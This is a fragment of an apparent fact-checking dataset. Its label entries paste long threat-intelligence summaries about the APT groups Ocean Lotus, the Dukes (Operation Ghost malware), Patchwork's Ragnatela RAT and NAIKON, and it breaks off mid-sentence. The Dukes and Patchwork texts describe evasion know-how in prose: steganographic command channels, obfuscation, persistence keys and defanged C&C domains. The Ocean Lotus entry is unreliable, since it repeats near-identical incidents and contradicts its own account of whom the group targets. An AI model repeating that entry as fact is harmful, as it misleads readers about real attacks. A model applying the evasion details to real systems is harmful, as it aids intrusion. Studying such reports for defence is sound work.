        "explain": "The Ocean Lotus APT group is a hacker group operating against both private and government organizations and their opponents since 2014. The primary motivation behind the attacks carried out by the Ocean Lotus group is information theft and espionage – given the private information sought to be obtained in the attacks and the high-profile individuals targeted. The targets of the Ocean Lotus group are generally foreign companies with sure success and interests in Vietnam’s hospitality, manufacturing, and consumer goods sectors. As well as the private sector, the Ocean Lotus group targets politicians and journalists opposed to the Vietnamese government.In 2016, Ocean Lotus was observed targeting a number of Vietnamese organizations with a watering hole attack. The group used a website that masqueraded as a site for Vietnamese students studying abroad. When visitors to the site attempted to register for an account, they were redirected to a malicious website that served malware. This malware allowed Ocean Lotus to gain control of the victim’s computer. In 2017, Ocean Lotus carried out a campaign against Vietnam’s National Assembly. The group sent spear phishing emails containing a link to a fake website that mimicked the National Assembly’s intranet login page. Victims who attempted to log in had their credentials stolen by Ocean Lotus. In 2018, Ocean Lotus launched a successful campaign against Vietnam’s Ministry of Foreign Affairs. The group sent spear phishing emails containing a link to a fake website that mimicked the Ministry of Foreign Affairs intranet login page. Victims who attempted to log in had their credentials stolen by Ocean Lotus. In 2019, Ocean Lotus was observed targeting a number of Vietnamese organizations with watering hole attacks. The group used websites that masqueraded as sites for Vietnamese students studying abroad. When visitors to the sites attempted to register for an account, they were redirected to malicious websites that served malware. This malware allowed Ocean Lotus to gain control of the victim’s computer. Ocean Lotus’ operations have continued into 2020. In February 2020, the group was observed targeting Vietnamese organizations with a phishing campaign. The group sent emails containing a link to a fake website that mimicked the login page for Google’s Gmail service. Victims who attempted to log in had their credentials stolen by Ocean Lotus. Ocean Lotus has been active for over eight years and shows no signs of slowing down. The group is skilled in carrying out sophisticated attacks and is considered a serious threat to organizations in Vietnam and other Southeast Asian countries.The techniques, tactics, and procedures used by the Ocean Lotus group to violate the security of the target system in their attacks help define the threat group’s characteristics and determine the countermeasures that can be taken. In addition, the information below will be helpful for an overview of how a typical attack lifecycle is performed with the software used by Ocean Lotus and for what purposes the tools are used.We have listed the steps to be taken in order to be protected from the threat and/or to minimize the possible damage according to the identified techniques, tactics, and procedures of the Ocean Lotus APT group.

        "original_label": "true",
        "label": "true",
        "explain": "It is exceptionally rare for a well-documented threat actor, previously implicated in very high-profile attacks, to stay completely under the radar for several years. Yet, in the last three years that is what APT group the Dukes (aka APT29 and Cozy Bear) has done. Despite being well known as one of the groups to hack the Democratic National Committee in the run-up to the 2016 US election, the Dukes has received little subsequent attention. The last documented campaign attributed to them is a phishing campaign against the Norwegian government that dates back to January 2017. In this white paper, we describe how we uncovered that the Dukes had been running successful espionage campaigns while avoiding public scrutiny, thanks to stealthy communication techniques and retooling. We call these newly uncovered Dukes campaigns, collectively, Operation Ghost, and describe how the group has been busy compromising government targets, including three European Ministries of Foreign Affairs and the Washington DC embassy of a European Union country, all without drawing attention to their activities.The Dukes, also known as APT29 and Cozy Bear, is an infamous cyberespionage group active since at least 2008. In particular, it is known for being one of the adversaries to have breached the Democratic National Committee during the 2016 US presidential election [1]. It was even featured in a joint report issued by the FBI and the Department of Homeland Security (DHS), as part of malicious cyber-activities the report dubbed Grizzly Steppe [2]. That report was published in 2017 and describes malicious activities that occurred around the presidential election of 2016. This section is a summary of the group’s previously documented activities to refresh the reader’s memory, since the last related publication dates from almost three years ago. Our most recent discoveries are detailed in the subsequent sections of this white paper.Even though the group’s activities are believed to have started in 2008, the first public report was released in 2013 with the analysis of MiniDuke by Kaspersky [3]. Over the next two years, multiple reports dissected the Dukes’ arsenal, including a comprehensive summary by F-Secure of the group’s activities from 2008 to 2015 [4]. One of the most recent attacks that we can link to the Dukes is the January 2017 phishing attempt against the Ministry of Foreign Affairs, the Labour Party and the Armed Forces of Norway [5]. Since then, most security experts have believed the Dukes went dark or completely changed their arsenal to pursue their mission. In November 2018, a strange phishing campaign hit dozens of different organizations in the United States, including government agencies, and think tanks. The attack leveraged a malicious Windows shortcut (a .lnk file) that bore similarities to a malicious shortcut used by the Dukes in 2016. However, that earlier sample was available in a public malware repository for many years, allowing another actor to easily conduct a false-flag operation. In addition, there is no evidence that any custom malware used only by the Dukes was employed during this attack. From FireEye’s detailed analysis of the attack [6], it was not possible to make a high-confidence attribution to this threat actor. Figure 1 summarizes the important events of the Dukes history. Some activities related to Operation Ghost are also presented to help understand the overlap between all the events. Over the years, it has been possible to draw the big picture of the Dukes main targets. The group is primarily interested in spying on governments either in the West or in former USSR countries. Besides governments, the group has also targeted various organizations linked to NATO, think tanks, and political parties. This targeting suggests a clear interest in collecting information allowing a better understanding of future international political decisions, which would seem of most interest to a government. Unlike other groups such as GreyEnergy [7] and TeleBots [8], it is important to note that we have never seen the Dukes engaged in cybersabotage operations. Surprisingly though, the group also has conducted spying operations outside its main focus. In 2013, Kaspersky researchers found evidence that part of the Dukes toolset had been used against drug dealers in Russia [9]. This may suggest that this toolset is not only used for collecting foreign intelligence but also for conducting LE investigations of criminal activities. The Dukes group is known to be a major player in the espionage scene. It is associated with a large toolset with more than ten different malware families written in C/C++ [10], PowerShell [11], .NET [12] and Python [13]. It has also adopted living-off-the-land tactics, misusing standard IT tools such as PsExec and Windows Management Instrumentation (WMI). As mentioned before, we invite our readers to read the F-Secure summary [4] for an analysis of the earlier malware platforms used by this threat actor.The group’s main initial tactic to breach a network is to send spearphishing emails that contain a link or an attachment. Figure 2 is an example of one such campaign, which occurred at the end of 2016. In order to increase the attackers’ chances, it is designed to be a subject of particular interest of the recipient. This is different from mass-spreading malicious email campaigns where the same email is sent to hundreds or thousands of people by crimeware actors.When targets click on these malicious links or attachments, a .zip archive that contains a malicious, macro-enabled Word document and a decoy (as shown in Figure 3) will be downloaded. If victims then open the malicious document and enable the macro, it will then install the PowerDuke backdoor [14]. In other cases, malicious Windows shortcuts (.lnk files) have been used instead of Word documents with malicious macros.However, this is not the only method used by the Dukes to gain initial access. In 2014, the Dukes started using two mass-spreading methods to deliver the OnionDuke implant:OnionDuke has some capabilities outside the standard espionage features, such as a Denial of Service (DoS) module, but we have not observed them used in the wild. Finally, the Dukes are also known for using multiple implants to compromise a target. It is very common to see an implant delivering another one to regain control of a system.The Dukes have employed several interesting tactics to hide the communications between the implants and their C&C servers, including the use of social media platforms and steganography. MiniDuke [17] and HammerDuke [12] leveraged Twitter to host their C&C URLs. In addition, they use a Domain Generation Algorithm (DGA) to generate new Twitter handles. Each time the malware generates a new handle, it fetches the Twitter page corresponding to that handle and searches the page for a specific pattern, which is the encrypted C&C URL. In CloudDuke [18], the operators leveraged cloud storage services such as OneDrive as their C&C channels. They were not the first group to use this technique, but it is generally effective for the attackers as it is harder for defenders to spot hostile connections to legitimate cloud storage services than to other “suspicious” or low-reputation URLs. Moreover, the Dukes like to use steganography to hide data, such as additional payloads, in pictures. It allows them to blend into typical network traffic by transferring valid images while its true purpose is to allow the backdoor to communicate with the C&C server. This technique has been described in Volexity’s PowerDuke blogpost [14]After 2017, it was not clear how the Dukes evolved. Did they totally stop their activities? Did they fully re-write their tools and change their tradecraft? We spent months apparently chasing a ghost then, a few months ago, we were able to attribute several distinct intrusions to the Dukes. During the analysis of those intrusions, we uncovered several new malware families: PolyglotDuke, RegDuke and FatDuke. We call the Dukes’ campaigns using these newly discovered tools Operation Ghost.We believe Operation Ghost started in 2013 and was still ongoing as of this writing. Our research shows that the Ministry of Foreign Affairs in at least three different countries in Europe are affected by this campaign. We also have discovered an infiltration by the Dukes at the Washington, DC embassy of a European Union country. This targeting is not surprising, and it shows that the Dukes are still active in high-profile organizations. We also believe that more organizations around the world might be affected but due to the use of unique C&C infrastructure for each victim, we were not able to identify other targets. One of the first traces of this campaign is to be found on Reddit in July 2014. Figure 4 shows a message posted by one of the Dukes’ operators. The strange string using an unusual charset is the encoded URL of a C&C server and is used by PolyglotDuke as described in section 4.2.On one hand, we noticed numerous similarities in the tactics of this campaign in comparison to previously documented ones: However, an attribution based only on the presence of known Dukes tools on the same machines should be taken with a grain of salt. We also found two other APT threat actors – Turla [19] and Sednit [20] – on some of the same computers. On the other hand, we were able to find strong code similarities between already documented samples and samples from Operation Ghost. We cannot discount the possibility of a false flag operation; however, this campaign started while only a small portion of the Dukes’ arsenal was known. In 2013, at the first known compilation date of PolyglotDuke, only MiniDuke had been documented and threat analysts were not yet aware of the importance of this threat actor. Thus, we believe Operation Ghost was run simultaneously with the other campaigns and has flown under the radar until now. PolyglotDuke (SHA-1: D09C4E7B641F8CB7CC86190FD9A778C6955FEA28), documented in detail in section 4.2 uses a custom encryption algorithm to decrypt the strings used by the malware. We found functionally equivalent code in an OnionDuke sample (SHA-1: A75995F94854DEA8799650A2F4A97980B71199D2) that was documented by F-Secure in 2014 [16]. It is interesting to note that the value used to seed the srand function is the compilation timestamp of the executable. For instance, 0x5289f207 corresponds to Mon 18 Nov 2013 10:55:03 UTC. The IDA screenshots in Figure 6 show the two similar functions.Similarly, the recent samples of the MiniDuke backdoor bear similarities with samples documented more than five years ago. Figure 7 is the comparison of a function in a MiniDuke backdoor listed by Kaspersky in 2014 [21] (SHA-1: 86EC70C27E5346700714DBAE2F10E168A08210E4) and a MiniDuke backdoor (SHA-1: B05CABA461000C6EBD8B237F318577E9BCCD6047) compiled in August 2018.Given the numerous similarities between other known Dukes campaigns and Operation Ghost, especially the strong code similarities, and the overlap in time with previous campaigns, we assess with high confidence that this operation is run by the Dukes.In Operation Ghost, the Dukes have used a limited number of tools, but they have relied on numerous interesting tactics to avoid detection. First, they are very persistent. They steal credentials and use them systematically to move laterally on the network. We have seen them using administrative credentials to compromise or re-compromise machines on the same local network. Thus, when responding to a Dukes compromise, it is important to make sure to remove every implant in a short period of time. Otherwise, the attackers will use any remaining implant to compromise the cleaned systems again. Second, they have a sophisticated malware platform divided in four stages:Figure 8 is a summary of the malware platform of Operation Ghost. During our investigation, we also found a previously unknown (and apparently now retired) third-stage backdoor, LiteDuke, that was used back in 2015. For the sake of historical completeness, it is analyzed in section 4.6.Third, we also noticed that the operators avoid using the same C&C network infrastructure between different victim organizations. This kind of compartmentalization is generally only seen by the most meticulous attackers. It prevents the entire operation from being burned when a single victim discovers the infection and shares the related network IoCs with the security communityWhen it comes to cyberespionage, it is not uncommon for the malware developers and operators to follow the standard working hours of the country where they are located. For instance, we previously showed that Sednit operators were generally working from 9 AM to 5PM in the UTC+3 time zone [20]. Previously, FireEye researchers noticed that the Dukes were also mainly operating in the UTC+3 time zone [12]. For Operation Ghost, we compiled three different types of timestamp in order to have an idea of their operational times:It should be noted that some of these timestamps may have been generated by an automated command system or an automated build system.Despite having analyzed the Dukes activities in several different organizations, we were not able to find the initial compromise vector. The group is known for sending well-crafted malicious emails, but we did not find any such samples. It should also be noted that two of the three targeted organizations we identified had previously been compromised by the Dukes, mainly in 2015. As such, it is highly possible that the attackers kept control over the compromised networks during this whole period. We observed them pivoting in an already-compromised network using lateral movement tools like PsExec and stolen administrative credentials. As such, from only a few compromised machines, they are able to expand their operations.PolyglotDuke is a downloader that is used to download and drop the MiniDuke backdoor. As mentioned in section 3.2 and shown in Figure 6, this downloader shares several similarities with other samples from previous Dukes campaigns such as the use of Twitter to retrieve and decode its C&C server address, as well as a custom string encryption implementation. Both 32- and 64-bit versions of PolyglotDuke were observed and have similar behavior. We dubbed this downloader PolyglotDuke in reference to its use of charsets from different languages to encode the C&C addresses. PolyglotDuke’s dropper embeds an encrypted PolyglotDuke within a resource type named GIF with the ID 129. The resource is encrypted with the following algorithm, using the string GIF89 from the resource (which is the 5 first magic bytes of the start of the GIF header) as the key:After decryption, the DLL is written to the current working directory and executed using rundll32.exe. The custom string encryption algorithm used by the PolyglotDuke dropper is identical to the one used by PolyglotDuke, as well as other samples from previous Dukes campaigns, and is depicted in Figure 7. As mentioned in section 3.2, it’s worth noting that this dropper shares a great deal of functionality with OnionDuke, such as the use of a GIF resource, the use of the same algorithm with the string GIF89 as key to decrypt the resource, and the use of the same custom encryption algorithm to encrypt the strings.Strings from PolyglotDuke are decrypted using two different algorithms. The string is either RC4 encrypted using the CryptDecrypt API where the key is derived from the system directory path with the drive letter removed, or using the custom encryption algorithm shown in Figure 6. An IDA Python script to decrypt these strings is provided in our GitHub repository. The C&C server address is retrieved and decoded from various public webpages such as Imgur, ImgBB or Fotolog posts, tweets, Reddit comments, Evernote public notes, etc. Several encrypted public webpage URLs are hardcoded in each sample (from three to six URLs in a single sample) and it will iterate over the hardcoded list of C&C server addresses until it is able to decode a valid C&C URL successfully. An example of a public webpage containing an encoded C&C URL is shown Figure 10. After retrieving the content of one of these webpages, PolyglotDuke parses it to find two delimiter strings and extracts the content between them. The extracted UTF-8 string uses a particular character set within a Unicode block such as Katakana [22], Cherokee [23] or Kangxi radicals [24]. Any given sample can only decode a C&C URL encoded in one of those charsets. The string is first converted to UTF-16, only the last byte of each codepoint is kept, then a custom mapping is used to transpose this to printable ASCII. The order of the characters of the resulting string is then reversed, resulting in the C&C URL. A script to decrypt the C&C URL, regardless of the Unicode range used, is provided on our GitHub repository. Interestingly, the text from the delimiter strings usually makes sense in the context of the fake post. The decoded C&C URL points to a PHP script with which the downloader communicates using GET requests, as described in the next section.The GET argument values are randomly generated but the first random string in each request should comply with a constraint based on a specific integer (see below). A string will be randomly regenerated until one complies with the constraints. The digits from the string representation of the MD5 hash of the randomly generated string are summed, and then modulo 5 of this value must match a specific integer. The communication with the C&C server to retrieve a payload follows this sequence:This sequence continues until a path to a file is provided between the  strings and the file downloaded. The communication steps are summarized in Figure 12. Interestingly, the root URLs of the C&C server used by PolyglotDuke redirect to domains with similar names hosting legitimate websites. This technique is probably used in order to avoid suspicion when investigating the traffic with the C&C server. For one of the C&C servers, the attackers forgot to add a TLD to the redirected domain. Examples of redirection are shown in Table 2.A data blob containing encrypted data is appended to the end the downloaded file: this technique allows data to be easily included in a JPEG or PNG image download in a way that means the image remains valid. We couldn’t retrieve any of the files downloaded by PolyglotDuke to confirm this hypothesis but the way the encrypted blob is added to such files in addition to their extension being .jpg or .png lead us to think that they were valid images used to look like legitimate traffic. To extract the payload from the file downloaded from the C&C server, PolyglotDuke will first decrypt the last eight bytes with RC4 using the same key as the one used for strings decryption. The first four decrypted bytes correspond the offset to the embedded blob relative to the end of the file and the last four bytes provide a value used as integrity check; that value is the same as the first four bytes at the beginning of the blob. The structure of the file is described in Figure 13.After obtaining the offset to the embedded blob and checking the integrity value, the size of the RC4-encrypted blob is retrieved from immediately afterward. Then, next to the encrypted blob, we find the signed SHA-1 hash of the blob. Before decrypting the blob, the hash signature is checked against an RC4-encoded public key hardcoded in the binary. The signature verification procedure is shown in Figure 14 , while the public key used to check the hash signature is shown in Figure 15. This technique ensures that only a payload signed by the operators could be executed on the victim’s machine, since the private key used to sign the hash is needed to generate a valid signature. After having successfully checked the hash signature of the encrypted blob, it is decrypted using the same key used for the RC4-encrypted strings. The format of the decrypted blob is shown in Figure 16. Notice that the same delimiter value is used and checked at various positions of the blob (in the example in Figure 16 it is 0x1BD75010). Two of the bytes between the first two delimiters define the action to be taken with the decrypted blob. The value immediately following the second delimiter is the size of the data, being either a PE or an encrypted configuration, followed by the data itself followed by a third delimiter, the size of the subsequent filename, and finally the filename itself. The correct extension (.dll or .exe) will be appended to the filename of the PE to be written, depending on the executable type. The list of valid combinations and their respective behaviors is shown on Table 3. RegDuke is a first-stage implant that is apparently used only when attackers lose control of the other implants on the same machine. Its purpose is to stay undetected as long as possible to help make sure the operators never lose complete control of any compromised machine. It is composed of a loader and a payload, the latter being stored encrypted on the disk. Both components are written in .NET. RegDuke persists by using a WMI consumer named MicrosoftOfficeUpdates. It is launched every time a process named WINWORD.EXE is started. Our analysis is based on the sample with SHA-1 0A5A7DD4AD0F2E50F3577F8D43A4C55DDC1D80CF.Between August 2017 and June 2019, we have seen four different main versions of the loader. The first version was not obfuscated and had the encryption key hardcoded in the code. Later versions read the encryption key from the Windows registry and use different types of obfuscation such as control-flow flattening or directly using .NET Reactor, a commercial obfuscator. Figure 17 is a sample of RegDuke obfuscated with .NET Reactor.The flow of the loader is simple. It reads the encrypted file at either a hardcoded path or at a value extracted from the Windows registry, as shown in Figure 18.Then, it decrypts it using a password and a salt either hardcoded in the loader or stored in the Windows registry. The encryption key and the initialization vector are derived from the password and the salt using the technique described in RFC 2898, also known as PBKDF2, as shown in Figure 19.The payload is a backdoor that resides in memory only, and that uses Dropbox as its C&C server. Its configuration is hardcoded in an internal class, shown in Figure 20. Our analysis is based on the sample with SHA-1 5905C55189C683BC37258AEC28E916C41948CD1C.We have seen the following clientId values being used: collection_3, collection_4, collection_6, collection_7, collection_8 and collection_99. However, other than collection_4, we were not able to determine the targets for these collections.The backdoor regularly lists the Dropbox directory corresponding to its clientId and downloads PNG files from it. The downloaded PNG files are valid pictures, as you can see in Figure 21.However, the attackers have used steganography to hide data in the pictures. In Figure 22, you can see the code looping over all the pixels of the image and extracting data from them. Each pixel is encoded into 24 bits: 8 for red, 8 for green and 8 for blue. The developers use a technique called “Least Significant Bit” to store 8 bits of data in each pixel, as shown in Figure 23. This technique has been used previously by other malware such as Gozi [25]. They extract two bits from the red value, three from the green and three from the blue.The steganographically altered image has almost no visible difference from the original image because the two or three least significant bits have a very limited impact on the color. For the green and blue components of each pixel a maximum of 7/256, and for the red component 3/256 of a fully saturated pixel variation will occur. Figure 24 shows a blue of value 255 (on the left) and the maximum deviation from that in just the blue spectrum with a value of 248 (on the right). There is apparently no difference but, by doing that on every pixel of the image, allows the attacker to store a backdoor in a still valid PNG image.As highlighted in section 3.2, the most recent versions of the MiniDuke backdoor have a lot of code similarities with earlier versions, such as the sample with SHA-1 of 86EC70C27E5346700714DBAE2F10E168A08210E4, described by Kaspersky researchers in 2014 [21]. Our analysis is based on the sample with SHA-1 B05CABA461000C6EBD8B237F318577E9BCCD6047, compiled on August 17, 2018. MiniDuke acts as a second-stage backdoor, which is dropped by one of the two first-stage components described in the sections above. The most recent samples we are aware of were compiled in June 2019 and show no major changes, except the C&C domain and the use of an invalid (likely transplanted) digital signature, as shown in Figure 25. This might be an attempt to bypass some security products.The backdoor is still written in pure x86 assembly but its size increased a lot – from 20 KB to 200+ KB. This is due to the addition of obfuscation, mainly control-flow flattening [26], as shown in Figure 26. This is a common obfuscation technique that makes it difficult to read the code because every function is split in a switch/case inside a loop.Some of the Windows API functions are resolved dynamically. The backdoor uses a simple hash function to obfuscate the name of the function it tries to resolve. The network communication is relatively simple. It can use the GET, POST and PUT HTTP methods to contact the hardcoded C&C server. In order to blend into the legitimate traffic, the data are prepended with a JPEG header. The resulting images are not valid, but it is very unlikely that anybody will check the validity of all pictures in the network traffic. Figure 27 is an example of a POST request to the C&C server. As the server was down at the time of capture, we were not able to receive a reply, but we believe the reply also contains a JPEG header, as the malware ignores the first bytes of the reply.In addition to the HTTP protocol, the malware is able to send and receive data over a named pipe. This feature typically allows it to reach machines on the local network that don’t have internet access. One compromised machine, with internet access, will forward commands to other compromised machines through the named pipe. A similar feature to the named pipe is the HTTP proxy. The malware will listen on a first socket, either on the default port 8080 or on a port specified by the operators. It will also open a second socket with the C&C server. It waits for connections on the first socket and when one is established, it proxies data between the two sockets. Thus, a machine without internet access, or with a firewall that blocks connections to the attackers’ domain, might still be able to reach the C&C through the proxy machine. FatDuke is the current flagship backdoor of the group and is only deployed on the most interesting machines. It is generally dropped by the MiniDuke backdoor, but we also have seen the operators dropping FatDuke using lateral movement tools such as PsExec. The operators regularly repack this malware in order to evade detections. The most recent sample of FatDuke we have seen was compiled on May 24, 2019. We have seen them trying to regain control of a machine multiple times in a few days, each time with a different sample. Their packer, described in a later section, adds a lot of code, leading to large binaries. While the effective code should not be larger than 1MB, we have seen one sample weighing in at 13MB, hence our name for this backdoor component: FatDuke. In this section, we will use the sample with SHA-1 DB19171B239EF6DE8E83B2926EADC652E74A5AFA for our analysis.During our investigation, we were not able to find a dropper for FatDuke. We believe the operators simply install the backdoor and establish persistence using the standard commands of an earlier stage backdoor. We also noted that FatDuke generally replaced the second-stage binary, reusing the persistence mechanism already in place. The persistence we have seen is very standard. They use the registry key HKLM\\SOFTWARE\\Microsoft\\ Windows\\CurrentVersion\\Run and creatd a new value named Canon Gear and value C:\\Program Files\\Canon\\Network ScanGear\\Canocpc.exe. This launches the backdoor each time a user logs in.Next, FatDuke contacts the C&C server, specified in the config, and uses one of the PHP scripts specified in the php_aliases field of the config. It is interesting to note that these filenames are related to the theme of the C&C server domain. For example, they registered the domain westmedicalgroup[.]net, and the aliases list contains filenames such as doctors.php or diagnostics.php. Figure 30 is a summary of the C&C protocol.The requests sent to the C&C server are crafted to look like typical GET requests and once again are related to the script name. For example, the request below uses parameters that you might expect to find on a forum’s website.However, while some fields are randomly generated strings, article and user could be used by the operator to pinpoint the victim. The first keyword, article, is an identifier – a SHA-256 hash of the volume identifier concatenated with MAC addresses found on the target computer. The other keyword, user, probably flags the general configuration that comes with the malware. This value is located in the PE resource section, right before the encoded configuration mentioned in section 4.5. The reply is an HTML page, with the HTML content copied from a legitimate website such as the BBC. However, if the C&C server wants to send a command to the malware, it will add an additional HTML img tag to the page, as shown in Figure 31.This will return a file, such as that shown in Figure 32. These files masquerade as PNG images in the GET request, but are not valid images. They contain a header of 0x37 bytes, matching one hardcoded in the malware, and a chunk of encrypted data that is base64 encoded. To further the PNG subterfuge, the header contains an incomplete, misplaced and corrupted PNG header, which may be sufficient to avert concern under cursory examination.The C&C servers used for FatDuke do not seem to be compromised websites. In order to look legitimate, they register variants of existing domains and redirect the homepage of their C&C server to the homepage of the real domain. As mentioned before, this technique is also used for PolyglotDuke C&C servers. For example, they registered the domain fairfieldsch[.]org and make it redirect to fairfields.northants.sch.uk, the website of a school in the UK. We also noticed that they used several C&C servers per targeted organization, but these servers apparently don’t overlap across the victims, ensuring tight compartmentalization. The FatDuke binaries are highly obfuscated. They use three different techniques in order to slow down analysis. First, they use string stacking for all important strings; this consists of building strings dynamically by pushing each character separately on the stack, rather than using strings from the .data section. They also add some basic operations to the stacking in order to prevent the extraction without emulating the code. Figure 34 shows such an example where the ASCII value of each letter is multiplied with a hardcoded value of 1.Second, they also add opaque predicates in most of the functions. Opaque predicates are conditions that are always True or always False. They are not part of the code's semantic, but the code is harder to read. Figure 35 is an example of opaque predicates we found in FatDuke. Whatever the result of rand() is, v11 is always equal to 15. Thus, the condition is always False.Third, they add junk code and junk strings. Unlike opaque predicates, the code will be executed but it is useless and again is not part of the semantics of the program. For example, the function in Figure 36 and in Figure 37 returns always the same value, which is never used.The binary contains a huge amount of strings from different projects like Chromium. It might be an attempt to bypass security products, similar to what was posted by SkyLight [27]. These strings are used to fill very large structures (about 1000 fields), probably to hide the few interesting fields used by the malware, as shown in Figure 38.We are not sure whether Dukes’ developers used a commercial obfuscation tool or if they developed their own. However, given their level of sophistication, it would not be surprising if they rely on their own obfuscator. LiteDuke is a third-stage backdoor that was mainly used in 2014-2015. It is not directly linked to Operation Ghost, but we found it on some machines compromised by MiniDuke. We chose to document it mainly because we did not find it described elsewhere. We have dubbed it LiteDuke because it uses SQLite to store information such as its configuration. Our analysis is based on the sample with SHA-1 AF2B46D4371CE632E2669FEA1959EE8AF4EC39CE.The backdoor code only exists in memory as only the loader is written to disk. The loader persists using a Windows shortcut (.lnk file) that is registered in the traditional CurrentVersion\\Run registry key. According to the PE header, the developers did not make use of Visual Studio to compile this backdoor. Figure 41 shows that they used the linker FASM 1.70. FASM (Flat Assembler) is an assembler that can produce Windows or Linux binaries. It reminds us of the MiniDuke backdoor, developed directly in x86 assembly.Interestingly, the malware apparently attempts to bypass Kaspersky security products by checking if the registry key HKCU\\Software\\KasperskyLab exists and if so, it waits 30 seconds before executing any additional code. We do not know whether this really bypasses any Kaspersky security products. The Crypto Container is an SQLite database, stored on the disk in the same directory as the loader, and uses SQLCipher. This SQLite extension encrypts the database using AES-256. The encryption key is the MD5 hash of machine-specific values (such as CPUID, the account name, the BIOS version and the processor name) to prevent decryption if, for example, the database ends up in a public malware repository. The key is not stored anywhere but is re-generated at each execution. The database contains three different tables, which are created using the following commands:The configuration default values are hardcoded in the binary. This SQLite table allows the malware operators to update these parameters easily. Similarly, the modules, which are plug-ins for the backdoor, are stored in the database. Since the database is encrypted, the modules never touch the disk in plaintext and will only be loaded into memory. Unfortunately, we have not yet been able to find any of the plug-ins used by LiteDuke. One artefact of the development method is the implementation of the backdoor commands. Usually, a backdoor will have a big switch statement to check the command sent by the C&C server against the list of commands implemented in the malware. In the case of LiteDuke, it is a succession of loops: one loop per implemented command, as shown in Figure 42. Each of the 41 different commands has between three and six possible command IDs. The program will loop successively on the list until the ID in the list matches the ID provided by the operator. The full list is available in Figure 43.Among the different samples we analyzed, the C&C domains are different, but they always use a script named rcv_get.php. We believe that the C&C domains are compromised servers. In order to blend into the network traffic, and similar to FatDuke, the malware checks the default browser and chooses its User-Agent request header accordingly, as shown in Table 7. It can also get the proxy configuration from Firefox, in the configuration file prej.js, or from Opera, in the operaprefs.ini file. This information is then used when establishing a connection to the C&C server.As one can see, some of these User-Agents are custom and they all refer to very old browsers, most of them released in 2011. It is also way less stealthy than with FatDuke’s sniffing of the real User-Agent used by the local browser. This reinforces our hypothesis that this backdoor was used many years ago and is no longer deployed in the wild.Operation Ghost shows that the Dukes never stopped their espionage activities. They were in the spotlight after the breach of the Democratic National Committee during the 2016 US presidential elections. However, they then recovered from that media attention and rebuilt most of their toolset. Using these new tools and previously used techniques, such as leveraging Twitter and steganography, they were able to breach Foreign Affairs Ministries of several European governments. This campaign also shows that APT threat actors going dark for several years does not mean they have stopped spying. They might pause for a while and re-appear in another form, but they still need to spy to fulfill their mandates. To help defenders better protect their networks, we will continue to monitor the Dukes’ developments. Indicators of Compromise can also be found on GitHub.

        "claim": "Patchwork is a cyber espionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. Patchwork has been seen targeting industries related to diplomatic and government agencies.",
        "original_label": "true",
        "label": "true",
        "explain": "Patchwork is an Indian threat actor that has been active since December 2015 and usually targets Pakistan via spear phishing attacks. In its most recent campaign from late November to early December 2021, Patchwork has used malicious RTF files to drop a variant of the BADNEWS (Ragnatela) Remote Administration Trojan (RAT). What is interesting among victims of this latest campaign, is that the actor has for the first time targeted several faculty members whose research focus is on molecular medicine and biological science. Instead of focusing entirely on victimology, we decided to shade some light on this APT. Ironically, all the information we gathered was possible thanks to the threat actor infecting themselves with their own RAT, resulting in captured keystrokes and screenshots of their own computer and virtual machines.We identified what we believe is a new variant of the BADNEWS RAT called Ragnatela being distributed via spear phishing emails to targets of interest in Pakistan. Ragnatela, which means spider web in Italian, is also the project name and panel used by Patchwork APT.Ragnatela RAT was built sometime in late November as seen in its Program Database (PDB) path “E:new_opsjlitest __change_ops -29no – CopyReleasejlitest.pdb”. It features the following capabilities: Executing commands via cmd Capturing screenshots Logging Keystrokes Collecting list of all the files in victim’s machine Collecting list of the running applications in the victim’s machine at a specific time periods Downing addition payloads Uploading files In order to distribute the RAT onto victims, Patchwork lures them with documents impersonating Pakistani authorities. For example, a document called EOIForm.rtf was uploaded by the threat actor onto their own server at karachidha[.]org/docs/. That file contains an exploit (Microsoft Equation Editor) which is meant to compromise the victim’s computer and execute the final payload (RAT). That payload is stored within the RTF document as an OLE object. We can deduce the file was created on December 9 2021 based on the source path information. Ragnatela RAT communicates with the attacker’s infrastructure via a server located at bgre.kozow[.]com. Prior to launching this campaign (in late November), the threat actor tested that their server was up and running properly. The RAT (jli.dll) was also tested in late November before its final compilation on 2021-12-09, along with MicroScMgmt.exe used to side-load it. Also in late November, we can see the threat actor testing the side-loading in a typical victim machine. We were able to gain visibility on the victims that were successfully compromised: Ministry of Defense- Government of Pakistan National Defense University of Islam Abad Faculty of Bio-Science, UVAS University, Lahore, Pakistan International center for chemical and biological sciences HEJ Research institute of chemistry, International center for chemical and biological sciences, univeristy of Karachi SHU University, Molecular medicine Another – unintentional – victim is the threat actor himself which appears to have infected is own development machine with the RAT. We can see them running both VirtualBox and VMware to do web development and testing. Their main host has dual keyboard layouts (English and Indian). Other information that can be obtained is that the weather at the time was cloudy with 19 degrees and that they haven’t updated their Java yet. On a more serious note, the threat actor uses VPN Secure and CyberGhost to mask their IP address. Under the VPN they log into their victim’s email and other accounts stolen by the RAT. This blog gave an overview of the latest campaign from the Patchwork APT. While they continue to use the same lures and RAT, the group has shown interest in a new kind of target. Indeed this is the first time we have observed Patchwork targeting molecular medicine and biological science researchers. Thanks to data captured by the threat actor’s own malware, we were able to get a better understanding about who sits behind the keyboard. The group makes use of virtual machines and VPNs to both develop, push updates and check on their victims. Patchwork, like some other East Asian APTs is not as sophisticated as their Russian and North Korean counterparts.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "NAIKON is a threat actor that has been active for more than a decade. Likely tied with China, the group focuses on high profile targets such as government agencies and military organizations in the South Asia region.DLL hijacking and other sideloading techniques have been around for as long as the Windows operating system. They are so frequent and so easily exploitable that there are tomes of information on how to both attack and defend against. But, while simple in theory, defending against sideloading is still challenging in the ever-increasing complexity of the software world. Subsequently, side-loading techniques have become extremely attractive compromise techniques for both commercial and state-sponsored threat actors. The purpose of this report is to provide details about tactics, techniques and procedures, as well as tools and infrastructure information of the attackers. The findings reveal their strategy to remain stealthy by mimicking legitimate applications that are running on individual infected machines. The collected evidence suggest that the aim of the APT group was espionage and data exfiltration. A recent publication from Kaspersky mentions a malware called FoundCore that seems to be the same with the backdoor we call RainyDay based on several similarities.During our investigation we identified that the victims of this operation are military organizations located in Southeast Asia. The malicious activity was conducted between June 2019 and March 2021. In the beginning of the operation the threat actors used Aria-Body loader and Nebulae as the first stage of the attack. From our observations, starting with September 2020, the threat actors included the RainyDay backdoor in their toolkit. The purpose of this operation was cyber-espionage and data theft.The main instrument used in this operation is the RainyDay backdoor through which several other custom-made or public tools were brought during the attack life cycle. In this 